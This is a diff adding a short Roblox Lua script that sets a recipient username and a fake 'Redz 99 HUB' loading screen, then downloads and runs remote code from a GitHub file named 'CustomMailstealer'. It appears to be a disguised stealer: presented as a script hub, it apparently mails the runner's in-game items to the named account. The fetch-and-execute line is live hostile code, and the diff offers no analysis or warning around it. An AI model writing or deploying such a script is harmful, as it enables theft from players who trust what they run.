@@ -1,0 +1,5 @@
+Username = "sreymey2k"
+G_LoadingScreen = "Redz 99 HUB"
+G_Mailmessage = "SCRIPT HUB"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriCustom/main/CustomMailstealer"))()
